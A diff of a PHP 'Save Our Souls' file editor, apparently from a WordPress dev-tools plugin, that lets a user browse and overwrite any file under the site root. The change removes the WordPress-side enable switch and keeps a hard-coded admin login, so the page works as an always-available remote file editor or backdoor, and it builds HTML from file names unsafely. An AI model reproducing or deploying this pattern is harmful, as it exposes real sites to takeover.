@@ -1,21 +1,5 @@
 <?php
-
 $root_dir = dirname(dirname(dirname(dirname(dirname(dirname(__FILE__))))));
-$wp_load = $root_dir . '/wp-load.php';
-
-if (!file_exists($wp_load)) {
-    $debug_message = 'Error: Could not load WordPress. Expected wp-load.php at: ' . $wp_load;
-    http_response_code(500);
-    die($debug_message);
-}
-
-require_once $wp_load;
-
-$sos_enabled = get_option('dev_tools_sos_enabled', false);
-if (!$sos_enabled) {
-    http_response_code(403);
-    die('SOS is disabled. Enable it in Dev Tools > SOS Settings in WordPress admin.');
-}
 
 $username = 'admin';
 $password = 'ohf*k';
@@ -38,14 +22,15 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['file_content'])) {
     }
 }
 
-function build_sos_direct_file_tree($dir) {
-    $output = '<ul>';
+function build_sos_file_tree($dir, $base_dir) {
+    $output = '<ul class="tree-list">';
     $files = scandir($dir);
     foreach ($files as $file) {
         if ($file === '.' || $file === '..') continue;
         $path = $dir . DIRECTORY_SEPARATOR . $file;
+        $rel_path = str_replace($base_dir, '', $path);
         if (is_dir($path)) {
-            $output .= '<li class="folder">' . htmlspecialchars($file) . build_sos_direct_file_tree($path) . '</li>';
+            $output .= '<li class="folder"><span>' . htmlspecialchars($file) . '</span>' . build_sos_file_tree($path, $base_dir) . '</li>';
         } else {
             $output .= '<li class="file"><a href="?file=' . urlencode($path) . '">' . htmlspecialchars($file) . '</a></li>';
         }
@@ -54,14 +39,71 @@ function build_sos_direct_file_tree($dir) {
     return $output;
 }
 
+function get_all_files($dir, $base_dir, &$results = []) {
+    $files = scandir($dir);
+    foreach ($files as $file) {
+        if ($file === '.' || $file === '..') continue;
+        $path = $dir . DIRECTORY_SEPARATOR . $file;
+        if (is_dir($path)) {
+            get_all_files($path, $base_dir, $results);
+        } else {
+            $rel_path = str_replace($base_dir, '', $path);
+            $results[] = ['path' => $path, 'name' => $file, 'rel_path' => $rel_path];
+        }
+    }
+    return $results;
+}
+
+$all_files = get_all_files($root_dir, $root_dir);
 ?>
 <!DOCTYPE html>
 <html>
 <head>
     <title>Save Our Souls - File Editor</title>
-    <link rel="stylesheet" href="style.css">
-    <link rel="stylesheet" href="<?php echo plugin_dir_url(__FILE__) . '../../assets/codemirror.min.css'; ?>">
-    <script src="<?php echo plugin_dir_url(__FILE__) . '../../assets/codemirror.min.js'; ?>"></script>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 0; background: #1a1a1a; color: #fff; }
+        .container { max-width: 1200px; margin: 20px auto; }
+        h1 { font-size: 2em; display: flex; align-items: center; gap: 10px; color: #00cc99; display: block; text-align: center; }
+        h1 svg { width: 32px; height: 32px; fill: #00cc99; }
+        ::-webkit-scrollbar { width: 10px; }
+        ::-webkit-scrollbar-track { background: #ffffff; }
+        ::-webkit-scrollbar-thumb { background: #00cc99; }
+        .success { background: #00cc99; padding: 10px; margin: 10px 0; border-radius: 5px; }
+        .error { background: #ff5555; padding: 10px; margin: 10px 0; border-radius: 5px; }
+        .file-editor { display: flex; background: #2d2d2d; border-radius: 8px; overflow: hidden; }
+        .file-tree { width: 30%; padding: 15px; border-right: 1px solid #444; max-height: 80vh; overflow-y: auto; }
+        .tree-list { list-style: none; padding-left: 20px; margin: 0; }
+        .tree-list .folder > span { cursor: pointer; font-weight: bold; padding: 5px 0; display: block; }
+        .tree-list .folder ul { display: none; }
+        .tree-list .folder.open > ul { display: block; }
+        .tree-list .file a { color: #00cc99; text-decoration: none; padding: 5px 0; display: block; }
+        .tree-list .file a:hover { color: #00ffbb; }
+        .file-content { width: 70%; padding: 15px; }
+        .file-content p { text-align: center; font-size: 1.1em; }
+        .file-content form { display: flex; flex-direction: column; gap: 10px; }
+        .file-content input[type="submit"] { padding: 10px; background: #00cc99; border: none; border-radius: 5px; color: #fff; cursor: pointer; font-weight: bold; }
+        .file-content input[type="submit"]:hover { background: #00ffbb; }
+        .select2{ max-width: 300px; margin-bottom: 10px; }
+        .select2-container { margin-bottom: 15px; }
+        .select2-selection__rendered { color: #fff !important;}
+        .select2-dropdown { background: #2d2d2d; border: 1px solid #444; color: #fff; max-width: 500px }
+        .select2-results__option { padding: 6px; }
+        .select2-results__option--highlighted { background: #00cc99 !important; color: #fff !important; }
+        .path-info { font-size: 0.8em; color: #888; }
+        .select2-container--default .select2-selection--single{ background-color: #1a1a1a !important; border-color: #00cc99; margin-bottom: 15px;}
+    </style>
+    <link rel="stylesheet" href="/wp-content/plugins/dev-tools/assets/codemirror/codemirror.min.css" />
+    <link rel="stylesheet" href="/wp-content/plugins/dev-tools/assets/codemirror/theme/monokai.css" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/select2/4.0.13/css/select2.min.css" />
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <script src="/wp-content/plugins/dev-tools/assets/codemirror/codemirror.min.js"></script>
+    <script src="/wp-content/plugins/dev-tools/assets/codemirror/mode/clike/clike.js"></script>
+    <script src="/wp-content/plugins/dev-tools/assets/codemirror/mode/php/php.js"></script>
+    <script src="/wp-content/plugins/dev-tools/assets/codemirror/mode/css/css.js"></script>
+    <script src="/wp-content/plugins/dev-tools/assets/codemirror/mode/xml/xml.js"></script>
+    <script src="/wp-content/plugins/dev-tools/assets/codemirror/mode/javascript/javascript.js"></script>
+    <script src="/wp-content/plugins/dev-tools/assets/codemirror/mode/htmlmixed/htmlmixed.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/select2/4.0.13/js/select2.min.js"></script>
 </head>
 <body>
     <div class="container">
@@ -72,7 +114,15 @@ function build_sos_direct_file_tree($dir) {
         <?php if (isset($message)) echo $message; ?>
         <div class="file-editor">
             <div class="file-tree">
-                <?php echo build_sos_direct_file_tree($root_dir); ?>
+                <select id="file-search" class="file-select">
+                    <option value="">Search for a file...</option>
+                    <?php foreach ($all_files as $file): ?>
+                        <option value="<?php echo htmlspecialchars($file['path']); ?>">
+                            <?php echo htmlspecialchars($file['name']); ?> <span class="path-info"><?php echo htmlspecialchars($file['rel_path']); ?></span>
+                        </option>
+                    <?php endforeach; ?>
+                </select>
+                <?php echo build_sos_file_tree($root_dir, $root_dir); ?>
             </div>
             <div class="file-content">
                 <?php
@@ -80,11 +130,11 @@ function build_sos_direct_file_tree($dir) {
                 if ($file && file_exists($file) && strpos($file, $root_dir) === 0) {
                     $content = file_get_contents($file);
                     $file_extension = pathinfo($file, PATHINFO_EXTENSION);
-                    // Визначаємо режим підсвітки залежно від розширення файлу
-                    $mode = 'php';
-                    if ($file_extension === 'css') $mode = 'css';
-                    elseif ($file_extension === 'js') $mode = 'javascript';
-                    elseif ($file_extension === 'html') $mode = 'htmlmixed';
+                    $mode = 'text/plain';
+                    if ($file_extension === 'php') $mode = 'application/x-httpd-php';
+                    elseif ($file_extension === 'css') $mode = 'text/css';
+                    elseif ($file_extension === 'js') $mode = 'text/javascript';
+                    elseif ($file_extension === 'html') $mode = 'text/html';
                     ?>
                     <form method="post" id="editor-form">
                         <input type="hidden" name="file_path" value="<?php echo htmlspecialchars($file); ?>">
@@ -93,15 +143,26 @@ function build_sos_direct_file_tree($dir) {
                     </form>
                     <script>
                     document.addEventListener('DOMContentLoaded', function() {
-                        var editor = CodeMirror.fromTextArea(document.getElementById('code-editor'), {
-                            lineNumbers: true,
-                            mode: '<?php echo $mode; ?>',
-                            theme: 'default',
-                            indentUnit: 4,
-                            tabSize: 4,
-                            lineWrapping: true
-                        });
-                        editor.setSize(null, 500);
+                        if (typeof CodeMirror === 'undefined') {
+                            console.error('CodeMirror is not loaded!');
+                            document.getElementById('code-editor').style.display = 'block';
+                            return;
+                        }
+                        try {
+                            var editor = CodeMirror.fromTextArea(document.getElementById('code-editor'), {
+                                lineNumbers: true,
+                                mode: '<?php echo $mode; ?>',
+                                theme: 'monokai',
+                                indentUnit: 4,
+                                tabSize: 4,
+                                lineWrapping: true,
+                                matchBrackets: true
+                            });
+                            editor.setSize(null, 500);
+                        } catch (e) {
+                            console.error('Error initializing CodeMirror:', e);
+                            document.getElementById('code-editor').style.display = 'block';
+                        }
                     });
                     </script>
                     <?php
@@ -114,11 +175,33 @@ function build_sos_direct_file_tree($dir) {
     </div>
     <script>
     document.addEventListener('DOMContentLoaded', function() {
-        document.querySelectorAll('.folder').forEach(folder => {
+        document.querySelectorAll('.folder > span').forEach(folder => {
             folder.addEventListener('click', function(e) {
                 e.stopPropagation();
-                this.classList.toggle('collapsed');
+                this.parentElement.classList.toggle('open');
             });
+        });
+
+        if (typeof jQuery === 'undefined' || typeof jQuery.fn.select2 === 'undefined') {
+            console.error('jQuery or Select2 is not loaded!');
+            return;
+        }
+
+        $('#file-search').select2({
+            placeholder: 'Search for a file...',
+            allowClear: true,
+            templateResult: function(data) {
+                if (!data.id) return data.text;
+                return $('<span>' + data.text.split(' ')[0] + ' <span class="path-info">' + data.text.split(' ').slice(1).join(' ') + '</span></span>');
+            },
+            templateSelection: function(data) {
+                if (!data.id) return data.text;
+                return data.text.split(' ')[0];
+            }
+        }).on('select2:select', function(e) {
+            if (e.params.data.id) {
+                window.location.href = '?file=' + encodeURIComponent(e.params.data.id);
+            }
         });
     });
     </script>
